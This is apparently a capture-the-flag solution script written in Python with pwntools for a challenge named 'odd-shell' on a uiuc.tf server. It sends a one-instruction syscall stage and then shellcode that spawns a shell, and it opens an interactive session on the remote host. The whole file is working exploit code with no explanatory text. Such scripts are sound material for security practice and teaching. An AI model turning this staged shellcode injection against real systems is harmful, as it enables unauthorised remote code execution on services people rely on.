#!/bin/env python3
from pwn import *

context.arch = "amd64"

stage1 = asm("syscall")
stage2 = asm("nop;" * 2 + shellcraft.sh())

#p = process("./chal")
p = remote("odd-shell.chal.uiuc.tf", 1337)

p.sendline(stage1)
p.clean()
p.sendline(stage2)

p.interactive()
